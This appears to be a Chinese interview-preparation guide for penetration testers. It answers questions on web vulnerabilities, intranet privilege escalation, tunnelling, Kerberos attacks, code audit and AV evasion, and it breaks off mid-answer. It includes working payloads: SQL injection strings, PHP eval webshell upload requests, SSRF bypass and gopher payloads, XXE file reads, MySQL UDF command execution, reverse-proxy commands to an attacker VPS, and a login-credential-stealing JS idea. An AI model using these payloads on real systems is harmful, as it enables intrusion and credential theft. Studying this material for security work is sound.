# 热门门技术工种方向

逆向，APT,红蓝对抗，代码审计，区块链，渗透测试(WEB, APP,内网,小程序)等

技术点

# WEB部分:

### sql注入部分

#### SQL注入原理

sql注入攻击是利用是指利用设计上的漏洞，在目标服务器上运行Sql语句以及进行其他方式的攻击，动态生成Sql语句时没有对用户输入的数据进行验证



#### SQL注入的种类?

联合注入，布尔盲注，延时盲注，报错注入，宽字节注入等



#### SQL注入的绕过有了解过吗?有绕过那些WAF?绕WAF的方法有哪些? 

双写关键字，大小写不敏感，16进制，内联注释，异或注入，把单引号转化为编码形式，进行赋值，避免使用单引号，使用函数进行代替，转义字符



#### 介绍一下你的SQL注入流程

首先测试正常数据，判断是否存在注入点，判断字段长度，判断字段回显位置，判断数据库信息，查找数据库名，查找数据库表名，查找列名，知道表名知道列名，获取数据



#### SQL注入一开始用来判断数据库类型的语句是什么?

利用内置函数暴数据库信息
version()版本；database()数据库；user()用户；
不用猜解可用字段暴数据库信息(有些网站不适用):
and 1=2 union all select version()
and 1=2 union all select database()
and 1=2 union all select user()
操作系统信息：and 1=2 union all select @@global.version_compile_os from mysql.user
数据库权限：
and ord(mid(user(),1,1))=114 返回正常说明为root

#### 讲一下sql写入webshell的条件，如果你在的目录没有执行权限怎么办

1.root权限2.网站的绝对路径且具有写入权限，能够使用into outfile和into dumpfile来进行写入。



#### 讲讲sql注入的条件

WEB应用程序对用户输入的合法性没有判断，前端传入的参数是攻击者可控的，并且带入数据库查询



#### SQL注入里面有一个into outfile函数有什么作用?

导出数据到pc的指定目录下



#### 如果一个目标存在多个传参点，如何快速测试？

可以使用Python写一个简单的爬虫，根据传参点的规则，把这些接口爬出来，测试



#### xp_cmdshell有了解过吗?能用来做什么

 xp_cmdshell 扩展存储过程将命令字符串作为操作系统命令 shell 执行，并以文本行的形式返回所有输出，exec xp_cmdshell 'dir c:/'，SQL Server 2005中的xp_cmdshell由于存在安全隐患，所以在SQL Server 2005中， xp_cmdshell 默认是关闭的。



#### 你有了解过那些数据库的sql注入?你是怎么快速判断它属于那个数据库的呢?

| Oracle     | `SELECT banner FROM v$versionSELECT version FROM v$instance` |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `SELECT @@version`                                           |
| PostgreSQL | `SELECT version()`                                           |
| MySQL      | `SELECT @@version`                                           |

#### 时间延时注入的原理? sleep() 函数不能用你一般会怎么处理

延迟注入，是一种盲注的手法, 提交对执行时间敏感的函数sql语句，通过执行时间的长短来判断是否执行成功，DNS Log



#### HTTP头注入了解过吗?注入点一般存在于那些地方

- `X-Host`
- `X-Forwarded-Server`
- `X-HTTP-Host-Override`
- `Forwarded`

网站以不安全的方式处理 Host 标头的值。如果服务器隐式信任 Host 标头，并且未能正确验证或转义它，则攻击者可能能够使用此输入注入操纵服务器，



#### SQL注入的防护方法有哪些呢?预编译的原理是什么呢?

参数化查询，预编译，预编译会让数据库跳过编译阶段，也就无法就进行词法分析，关键字不会被拆开，所有参数 直接 变成字符串 进入 数据库执行器执行

#### Order by注入了解吗

### XSS部分

#### XSS的原理是什么? xss的三种类别有什么不同

恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。

反射型：经过后端，不经过数据库

存储型：经过后端，经过数据库

DOM：不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。



#### Xss存在于那些地方?仅仅是前端吗?

1. GET型URL中的XSS
如果在URL中提交的参数值，在页面中显示。很有可能就存在XSS。

2. POST型表单中的XSS
如果在表单中提交的参数值，在页面中显示。很有可能就存在XSS。

3. JSON中的XSS
JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。
JSON最常用的格式是对象的 键值对。例如下面这样：{“firstName”: “Brett”, “lastName”: “McLaughlin”}


4. 自定义HTTP头中的XSS
如果在HTTP自定义头中提交的参数值，在页面中显示。很有可能就存在XSS。

#### xss用script就可以反射了吗?

存储型和反射型有什么区别?本质上的区别

存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie等

反射型XSS，非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容



#### 反射性xss的前提是什么呢

三个条件：用户访问网站并提交数据，响应数据或页面中包含提交的数据，网站对输入输出数据没有充分检查。



#### xss的防护方法有哪些呢?要是有了httponly是不是就不能xss绕过了呢?

- **到达时过滤输入。**在收到用户输入时，根据预期或有效输入尽可能严格地进行过滤。

- **对输出的数据进行编码。**在 HTTP 响应中输出用户可控数据时，对输出进行编码以防止其被解释为活动内容。根据输出上下文，这可能需要应用 HTML、URL、JavaScript 和 CSS 编码的组合。

- **使用适当的响应头。**为了防止不打算包含任何 HTML 或 JavaScript 的 HTTP 响应中的 XSS，您可以使用`Content-Type`和`X-Content-Type-Options`标头来确保浏览器以您想要的方式解释响应。

- **内容安全政策。**作为最后一道防线，您可以使用内容安全策略 (CSP) 来降低仍然发生的任何 XSS 漏洞的严重性。

  

#### 在已经有shell的情况下，如何使用xss实现对目标站的长久控制

后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。

在登录后才可以访问的文件中插入XSS脚本。



### ssrf部分

#### 讲一下ssrf的利用以及ssrf的成因

在典型的 SSRF 攻击中，攻击者可能会导致服务器连接到组织基础架构内的仅供内部使用的服务。在其他情况下，他们可能会强制服务器连接到任意外部系统，从而可能泄露敏感数据，例如授权凭据,在针对服务器本身的 SSRF 攻击中，攻击者诱导应用程序通过其环回网络接口向托管应用程序的服务器发出 HTTP 请求。这通常涉及提供带有主机名的 URL，例如`127.0.0.1`（指向环回适配器的保留 IP 地址）或`localhost`（同一适配器的常用名称）。

#### ssrf-般出现在哪里，你是如何判断这个点存在是ssrf漏洞的

SSRF主要会在一下地方出现

url请求远程服务器的资源，如果url是用户可控制的，就非常危险，一定要做好过滤，使用白名单，限制内网IP,
1.在线翻译
2.在线分享
3.收藏功能
4.调用url的功能
5.数据库内置功能



#### 如何防御ssrf漏洞呢

1、过滤返回的信息，如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。
2、统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态。
3、限制请求的端口，比如80,443,8080,8090。
4、禁止不常用的协议，仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp://等引起的问题。
5、使用DNS缓存或者Host白名单的方式。



#### ssrf有哪些绕过方法

###### 1、攻击本地

```
http://127.0.0.1:80
http://localhost:22
```

###### 2、利用[::]

```
利用[::]绕过localhost
http://[::]:80/  >>>  http://127.0.0.1
```

也有看到利用http://0000::1:80/的，但是我测试未成功

###### 3、利用@ 

```
http://example.com@127.0.0.1
```

###### 4、利用短地址

```
http://dwz.cn/11SMa  >>>  http://127.0.0.1
```

###### 5、利用特殊域名

利用的原理是DNS解析

```
http://127.0.0.1.xip.io/
```

```
http://www.owasp.org.127.0.0.1.xip.io/
```

###### 6、利用DNS解析

在域名上设置A记录，指向127.0.1

###### 7、利用上传

```
也不一定是上传，我也说不清，自己体会 -.-
修改"type=file"为"type=url"
比如：
上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF
```

###### 8、利用Enclosed alphanumerics

```
利用Enclosed alphanumerics
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ  Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

###### 9、利用句号

```
127。0。0。1  >>>  127.0.0.1
```

###### 10、利用进制转换

```
可以是十六进制，八进制等。
115.239.210.26  >>>  16373751032
首先把这四段数字给分别转成16进制，结果：73 ef d2 1a
然后把 73efd21a 这十六进制一起转换成8进制
记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x
```

```
http://127.0.0.1  >>>  http://0177.0.0.1/
```

```
http://127.0.0.1  >>>  http://2130706433/
```

```
http://192.168.0.1  >>>  http://3232235521/
http://192.168.1.1  >>>  http://3232235777/
```

###### 11、利用特殊地址

```
http://0/
```

###### 12、利用协议

```
Dict://
dict://<user-auth>@<host>:<port>/d:<word>
ssrf.php?url=dict://attacker:11111/
SFTP://
ssrf.php?url=sftp://example.com:11111/
TFTP://
ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET
LDAP://
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
Gopher://
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
```

###### 13、使用组合

各种绕过进行自由组合即可

### csrf部分

#### 讲一下csrf原理

简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器之前认证过，所以被访问的站点会认为这是真正的用户操作而去运行。



#### csrf的防御方法有哪些? referer验证和token那个安全级别高呢?

有三种方法被广泛用来防御CSRF攻击：验证token，验证HTTP请求的Referer，还有验证XMLHttpRequests里的自定义header。token安全等级更高，因为并不是任何服务器都可以取得referer，如果从HTTPS跳到HTTP，也不会发送referer。并且FLASH一些版本中可以自定义referer。但是token的话，要保证其足够随机且不可泄露。(不可预测性原则)

### 文件上传

#### 讲一下条件竞争的原理

文件上传时，先上传、再检测、不合条件时再删掉的场景，攻击者利用多线程并发不断上传一个可以写webshell的脚本，然后马上访问这个刚上传的文件，当服务端判断并删除的时间大于客户端线程访问的时间时，客户端可以在删除之前访问到这个脚本并成功运行写入webshell



#### 文件上传WAF怎么绕过

#### 1、换行

```
Content-Disposition: form-data; name="file"; filename="1.p
hp"
Content-Type: image/jpeg
<?php @eval($_POST[1])?>
-----------------------------127619278770
```

#### 2、多个等号(不止2，3个)

```
Content-Disposition: form-data; name="file"; filename=="2.php"
Content-Type: image/jpeg
<?php @eval($_POST[1])?>
-----------------------------127619278770
```

```
Content-Disposition: form-data; name="file"; filename==="3.php"
Content-Type: image/jpeg
<?php @eval($_POST[1])?>
-----------------------------127619278770
```

#### 3、00截断

```
Content-Disposition: form-data; name="file"; filename="4.php%00"
Content-Type: image/jpeg
<?php @eval($_POST[1])?>
-----------------------------127619278770
```

#### 4、文件名+；号

```
Content-Disposition: form-data; name="file"; filename="6;.php"
Content-Type: image/jpeg
<?php phpinfo()?>
-----------------------------127619278770
```

#### 5、文件名+‘

```
Content-Disposition: form-data; name="file"; filename="7'.php"
Content-Type: image/jpeg
<?php phpinfo()?>
-----------------------------127619278770
```

#### 6、上传.htaccess

```
Content-Disposition: form-data; name="file"; filename=".htaccess"
Content-Type: image/jpeg
AddType application/x-httpd-php jpg
-----------------------------127619278770
```

#### 文件上传常见绕过方法

禁用js，抓包修改后缀，上传phtml php3 php4 php5 Php php (空格) php，pphphp，抓包修改content-type，添加文件头，如GIF98a，win系统解析漏洞绕过（win服务器比较难报出来，一般是知道它的绝对路径特点，有盘符可能为win   二是利用错误文件报错如正确为index.php,改为错误的1index.php 或者index.xxxx,如果报错服务器中间件信息为iis那它是win服务器）

绕过：
1、上传1.php(或者图片马)，抓包改为1.php.
2、上传1.php(或者图片马)，抓包改为1.php::$DATA
3、上传1.php(或者图片马)，抓包改为1.php:1.jpg
4、上传1.php(或者图片马)，抓包改为1.php::$DATA



#### 文件上传如何防护?白名单校验和黑名单校验

文件名包括过滤文件后缀名,修改上传后的文件名(可以是基于时间的随机字符串),同时禁止文件路径对外展示  
文件内容主要是针对图片马,对文件进行二次渲染,这是最变态的一种方式,可以避免大部分文件上传漏洞
其次是权限,文件上传目录取消执行权限,使上传的脚本不能执行



#### 二次渲染了解过吗?你是怎么确定加入shell的位置的

在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），处理后在放到网站对应的标签进行显示，把原图片和上传之后的图片进行对比，有相同的地方就可以合成图片马

### 文件包含

#### 文件包含的函数有哪些? include和require的区别

文件包含函数：include、include_once、require、require_once
include/require区别：对文件包含的操作几乎一样除了在报错方面有差别，include函数假如找不到所包含的文件它会跳过执行下一条代码，发出警告(warning)但是对于require函数，他会出现报错(Error)然后结束



#### 伪协议你了解哪些?伪协议的条件(需要开启那些配置)

先把php.ini的`allow_url_fopen` 和`allow_url_include`设置为On

```PHP
file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
```

### XXE

#### xxe的原理

所谓的XML注入就是在XML中用户输入的地方，根据输入位置上下文的标签情况，插入自己的XML代码。虽然由于普通的XML注入利用面窄，现实中几乎用不到，但是我们可以想到，既然可以插入XML代码我们为什么不能插入XML外部实体呢，如果能注入成功并且成功解析的话，就会大大扩宽我的XML注入的攻击面了。于是就出现了XXE



#### xxe语句怎么去构建

1.直接通过DTD外部实体声明如下图

 ```
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE note[	<!ENTITY xxe SYSTEM "file:///php//aa.txt">]>
 <login>&xxe;</login>
 ```


  2.通过DTD文档引入外部DTD文档

  3.通过DTD外部实体声明引入外部实体声明 (先写一个外部实体声明→引用攻击者服务器上面的外部实体声明)



#### 你是怎么判断存在xxe漏洞的

最直接的方法就是用burp抓包,然后,修改HTTP请求方法,查看是否有提交xml文档,然后修改提交的xml文档,或者修改一些Content-Type头部字段等等,查看返回包的响应,看看应用程序是否解析了发送的内容,一旦解析了,那么有可能XXE攻击漏洞



#### xxe漏洞的危害有那些?你是怎么利用xxe漏洞的呀?

读取系统文件；执行系统命令；探测内网端口；攻击内部网络。

用burp抓包,修改xml语句



#### 怎么防御xxe漏洞

配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD



### 命令执行

#### 命令执行相关函数

**1、eval 函数** 这个函数能够把字符串当成代码来执行，以分号结尾可以理解为是完整语句，即使报错加上分号之后语句也会成功执行。

**2、Assert** assertion是字符串，它将会被当做PHP代码来执行。

**3、call_user_func** callback是将被调用的回调函数，parameter是0个或以上的参数，被传入回调函数。

4、call_user_func_array callback被调用的回调函数，param_ arr要 被传入回调函数的数组。

5、create_function  args是要创建的函数的参数，code是函 数内的代码。

6、preg_replace 执行一个正则表达式的搜索和替换  /e修正符使preg_ _replace将 replacement 参数当做PHP代码[在适当的逆向引用和替换完之后]

7、array_map   array_ map -为 数组的每个元素应用回调函数

8、Usort  uasort-使用用户自定义的比较函数对数组中的值进行排序并保持索引关联

9、{php代码} $ {phpinfoO};

命令执行WAF绕过吗

https://www.freebuf.com/articles/web/185158.html

php.ini启用disable_functions, 怎么绕过

蚁剑的bypass插件，&_GET['a'](&_GET['b']) 然后构造：a=exec&b=phpinfo()然后进行绕过

### 代码执行

#### 代码执行相关函数

https://www.cnblogs.com/lnterpreter/p/14225838.html

### 业务逻辑漏洞

#### 了解过那些逻辑漏洞

#### **逻辑漏洞主要产生的位置**

登录处，业务办理处，验证码处，支付处，密码找回处



#### 支付的逻辑漏洞，你是怎么改价格的，讲三种方法?

https://www.cnblogs.com/sijidou/p/13121335.html

### 反序列化漏洞

PHP, JAVA原理
PHP, JAVA修复
CTF中的反序列化玩过吗?

https://www.ajsafe.com/news/315.html

# 内网部分:

### 提权

#### 常用哪些方式提权?

答：Windows上可以低版本采用 at 创建定时任务提权、sc 创建服务提权；借助数据库提权，系统漏洞提权，系统上安装的第三方软件提权，不安全的配置，注册表，Linux，核漏洞提权，历史漏洞提权，利用以root权限运行的服务，NFS权限弱，Suid和Guid配置错误，滥用SUDO，利用"."路径配置错误，利用定时任务(Cron jobs)，配符注入

#### 请讲一下udf提权

答：MySQL的udf提权，首先获取MySQL的root权限，利用一些webshell提权

UDF为User Defined Function用户自定义函数，也就是支持用户自定义函数的功能。这里的自定义函数要以dll形式写成mysql的插件，提供给mysql来使用。也就是说我们可以通过编写dll文件来实现我们需要的功能，利用UDF提权需要知道root账户的密码

```c
文件末为.so，则为linux系统，如果是win，则后缀为dll
```

开始提权
根据数据库版本选择上传udf.dll的位置

```c
select version();      #查看版本
```

如果版本号大于5.1.4 上传udf的位置应该放在mysql\lib\plugin【如果不存在目录 自己新建一个】
如果版本小于5.1 上传udf的位置应该放在c盘的windows或者windows32目录里

```c
show variables like "%plugin%"    #查看plugin位置
```

secure_file_priv会影响我们的能否使用dumpfile，以及上传的位置

```c
show variables like "%secure%"    #查看secure_file_priv
```

当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权

当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权

当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权

secure_file_priv可以在mysql的配置文件[my.ini]里面修改
但是重启数据库才能生效

如果没有路径，尝试创建路径

```sql
select 233 into dumpfile 'D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin::$index_allocation';
```

```c
show variables like "%compile%";     #查看数据库是多少位的
```

选择多少位的udf.dll

写入动态链接库

```sql
SELECT 0x7f454c4602... INTO DUMPFILE 'D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll';
```

国光大佬博客有现成的16进制代码：https://www.sqlsec.com/tools/udf.html

创建自定义函数并调用命令

```
mysql > CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';
```

导入成功后查看一下 mysql 函数里面是否新增了 sys_eval：

```
mysql> select * from mysql.func;
+----------+-----+---------+----------+
| name     | ret | dl      | type     |
+----------+-----+---------+----------+
| sys_eval |   0 | udf.dll | function |
+----------+-----+---------+----------+
```

这里的 sys_eval 支持自定义，接着就可以通过创建的这个函数来执行系统命令了：

```
mysql > select sys_eval('whoami');
```

如果在 Windows 系统下的话应该就是最高权限了，执行一些 net user 增加用户的命令应该都是可以成功的

删除自定义函数

```
mysql > drop function sys_eval;
```



#### linux的提权方法有哪些

内核漏洞提权，先查看内核版本，根据版本选择提权工具

利用SUID提权，可以允许提权的已知 Linux 可执行文件有：Nmap，Vim，find，Bash，More，Less，Nano，cp，如find /tmp/a.txt -exec whoami \;

SUDO提权，需要当前用户可以使用sudo，并且知道用户密码，如git -p help,输入密码，输入!/bin/bash成功进入root终端

计划任务，



### 代理转发

#### 代理转发常用的工具有哪些?

|                       |                |         |                                                              |                                                              |                                                              |             |              |          |
| --------------------- | -------------- | ------- | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ----------- | ------------ | -------- |
| 类型                  | 名称           | 需要VPS | 格式                                                         | 特点                                                         | 备注                                                         |             |              |          |
| 端口转发              | LCX            | yes     | exe                                                          | RDP3389反弹，简单方便，使用频率高                            |                                                              |             | Proxifier    | 全局代理 |
| rtcp                  | yes            | py      | SSH22反弹常用                                                |                                                              |                                                              | SocksCap64  | 部分应用代理 |          |
| Fpipe                 | yes            | exe     | 多端口转发                                                   |                                                              |                                                              | proxychains | 部分应用代理 |          |
| antifw                | no             | exe     | 停掉IIS动作有点大                                            |                                                              |                                                              |             |              |          |
| Tunna                 | no             | py      | 正向代理 需上传shell；22&3389均可；亦可代理内网其他主机； 速度有点慢。 |                                                              |                                                              |             |              |          |
| reDuh                 | no             | java    | 正向代理； 需上传shell；22&3389均可；亦可代理内网其他主机；  |                                                              |                                                              |             |              |          |
| ssocks                | yes            | py      | 有windows版：Ssock_win.exe linux 需编译安装； 结合proxychains使用； |                                                              |                                                              |             |              |          |
| web代理               | reGeorg        | no      | py                                                           | 正向代理 需上传shell且需配Proxifier； 内网渗透必备即使尚未提权。 | reGeorg是reDuh的继承者，利用了会话层的socks5协议，效率更高。 |             |              |          |
| Phpsocks              | no             | php     | 不好用，有局限                                               |                                                              |                                                              |             |              |          |
| s5.py                 | no             | py      | web代理，简单方便快捷                                        | [ringzero@557.im](mailto:ringzero@557.im)                    |                                                              |             |              |          |
| htran                 | yes            | exe     | 正向代理/反向代理 正反向端口转发                             | 正向代理不需要自己VPS                                        |                                                              |             |              |          |
| EarthWorm             | yes            | C       | 支持多平台； 正向代理、反向代理； 多重网络应用 很好用。      | 正向代理不需要自己VPS Termite                                |                                                              |             |              |          |
| shell反弹             | ssh bash nc py | yes     | -                                                            | 频率最高                                                     |                                                              |             |              |          |
| php jsp perl ruby lua | -              | -       | 看需求点                                                     |                                                              |                                                              |             |              |          |
| VPN                   | -              | -       | 看需求点                                                     |                                                              |                                                              |             |              |          |
| meterpreter           | -              | -       | msf 套装                                                     |                                                              |                                                              |             |              |          |

#### ew的正向代理和反向代理讲一下

ew正向代理

```
正向代理:ew –s ssocksd –l 1080
即在靶机上直接执行正向代理，在挂上全局代理，靶机相当于跳板机
```

ew反向代理

```
vps执行命名：
./ew -s rcsocks -l 1080 -e 8888
攻击者具有独立IP的vps ，执行ew，设置监听本地的1080端口，并将从靶机8888端口转发到本地1080端口

靶机执行命令:
./ew -s rssocks -d vps_ip -e 8888 
公网主机（即vps）添加转接隧道，将 1080 收到的代理请求转交给反连 8888 端口的主机

使用:
访问 vps:1080 可使用rssocks主机提供的socks5代理服务
```

#### 讲一下ssh代理还有frp代理

#### Neo-reGeorg代理是如何做的

#### ew和neoreg的区别

### 内网信息搜集

#### 如何快速定位域控，介绍三种方式

答：net view,net time,

#### 一般域内信息收集你会收集那些信息

答：密码凭据信息，第三方软件信息，域用户的主机信息，域用户的网络架构，操作系统补丁信息

#### 如何快速了解服务器的系统信息

systeminfo详细信息
net start 启动服务
tasklist进程列表
schtasks计划任务

#### 后台有一个进程，你需要找到他的程序执行文件，该怎么找?

已知程序名称：ps -aux | grep NAME 

 已知端口：netstat -anp | grep :port 

 已知PID：ps -aux | grep PID 

  然后通过/proc/PID目录中exe -> xxxx 即可查找到程序的执行位置



#### 有做过内网实战吗?讲一下

#### mimitatz除了抓密码还能做啥

答：获取系统明文密码或者hash值，还能进行口令传递攻击

#### 约束委派和非约束委派的区别

对于非约束性委派，服务账号可以获取被委派用户的 TGT ，并将 TGT 缓存到 LSASS 进程中，从而服务账号可使用该 TGT ，模拟用户访问任意服务。由于非约束委派的不安全性，微软在Windows Server 2003中发布了约束性委派。对于约束性委派（Constrained Delegation），即Kerberos的两个扩展子协议 S4u2self (Service for User to Self) 和 S4u2Proxy (Service for User to Proxy)，服务账号只能获取用户的TGS，从而只能模拟用户访问特定的服务。

#### 黄金票据和白银票据

黄金票据
Golden Ticket是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了黄金票据就有了域内的最高权限。

白银票据
Silver Tickets就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以白银票据只能访问指定服务。



#### pth，ptt, ptk区别

PTH(pass the hash)#利用 lm 或 ntlm 的值进行的渗透测试

PTT(pass the ticket) #利用的票据凭证 TGT 进行的渗透测试 

PTK(pass the key)#利用的 ekeys aes256 进行的渗透测试



#### windows的身份切换和令牌切换

#### 内网拿了web shell, 发现不出网，怎么搞隧道

https://zhuanlan.zhihu.com/p/341685611

## 代码审计

PHP, JAVA, Python等代码审计

#### 请举例说明PHP，Java代码审计部分区别

答：Java有过滤器，加载器

#### 常见代码审计的流程，你怎么做的?

##### 代码审计方法与步骤

###### **一、审计前的准备**

（1）获得[源码](https://so.csdn.net/so/search?q=源码&spm=1001.2101.3001.7020)
大多数PHP程序都是开源的、找到官网下载最新的源码包。
（2）安装网站
在本地搭建网站，一边审计一边调试。实时跟踪各种动态变化。

###### **二、把握大局**

（1）网站结构
浏览源码文件夹，了解该程序的大致目录
（2）入口文件
index.php、admin.php文件一般是整个程序的入口，详细读一下index文件可以知道程序的[架构](https://so.csdn.net/so/search?q=架构&spm=1001.2101.3001.7020)，运行流程，包含那些配置文件，包含哪些过滤文件以及包含那些安全过滤文件，了解程序的业务逻辑。
（3）配置文件
一般类似config.php等文件，保存一些数据库相关信息、程序的一些信息。先看看数据库编码，如果是gbk则可能存在管字节注入。如果变量的值用双引号、则可能存在双引号解析代码执行的问题。
（4）过滤功能
通过详读公公函数文件和安全过滤文件等文件，清晰掌握用户输入的数据，哪些被过滤，哪些无过滤，在哪里被过滤了，如何过滤的，能否绕过过滤的数据。过滤的方式是替换还是正则？有没有GPC？有没有使用addslasher（）处理？

> 网站结构案例（1）
> ![在这里插入图片描述](http://image.daishen.ltd/i/2023/02/02/63db365be40ae.png)

> 已经搭建在本地的网站结构案例（2）
> ![在这里插入图片描述](http://image.daishen.ltd/i/2023/02/02/63db365bd54b3.png)

###### 审计方法

-  **通读全文法**
  通读全文发作为一种最麻烦的方法也是最全面的审计方法。特别是针对大型程序，源码成千上万行，这要读到什么时候。但是该方法也是一种必要的方法。了解整个应用的业务逻辑，才能挖掘到更多更有价值的漏洞。
  这种方法一般是企业对自身产品的审计，当然，对于小型应用，未尝不可以读一读。前面的把把握大局也包含在通读全文法里面。
-  **敏感函数参数回溯法（shell_exec）**
  这个方法是最高效，最常用的方法。
  大多数漏洞的产生是因为函数的使用不当导致的，我们只要找到这样的一些使用不当的函数，就可以快速挖掘想要的漏洞。利用正则匹配一些高危函数，关键函数以及敏感关键字，然后就可以分析判断敏感函数的上下文，追踪参数源头。
-  **定向功能分析法（安装问题）**
  该方法主要是根据程序的业务逻辑来说审计的。
  首先是用浏览器逐个访问浏览，根据相关功能，大概推测可能存在哪些漏洞

> 常见漏洞

![在这里插入图片描述](http://image.daishen.ltd/i/2023/02/02/63db365bd4899.png)

#### 代码审计需了解的一些框架

php:thinkphp

java:spring,springboot

python:django,flask

#### 请说明如SQL注入漏洞原理

## 查杀与免杀

二进制免杀(power免杀版本限制)
加壳工具，加载免杀，免杀项目
powershell做免杀，使用的是那哪个版本
分离免杀的原理

ShellCode混淆加密，无文件落地，分离拆分，白名单，DLL加载，Syscall，加壳加花，

资源修改，特征修改，二次开发CS，内存休眠，进程注入，反沙盒，反调试，CDN解析等

## 工具部分:

### 常见工具使用面

sqlmap, burpsuite, awvs, xray,msf, cs, mimikatz, wireshark, nmap,nessus, goby等工具介绍及对应操作需求等(考核各类工具了解情况)

### 自主优秀开发面

有自己自主开发的工具或脚本吗?请简单介绍下?
有使用过比较好的工具或脚本吗?请简单介绍下?
一般你为什么会使用自己开发或新出的?你用什么语言开发等?

## #其他部分:

### 1.说几个你知道的逻辑漏洞的类型?

一：订单金额任意修改

二：验证码回传

三．未进行登陆凭证验证

四：接口无限制枚举

五：cookie设计存在缺陷

六：找回密码存在设计缺陷

七：单纯读取内存值数据来当作用户凭证

### 2.给你一个登录框，可能存在什么样的漏洞?

https://www.freebuf.com/articles/web/276120.html

### 3.假如现在给你一个网站，你会怎么样去进行渗透测试，多说一下你的思路

https://www.freebuf.com/articles/web/290055.html

明确目标，分析风险获取授权，信息收集，漏洞探测，漏洞验证，漏洞利用，信息整理，生成报告

### 4.如何判断是否CDN?要是ping都一样就能判断没有CDN了吗?有CDN如何绕过?

**验证是否存在CDN**
方法1：
使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：
http://ping.chinaz.com/
http://ping.aizhan.com/
http://ce.cloud.360.cn/

方法2：
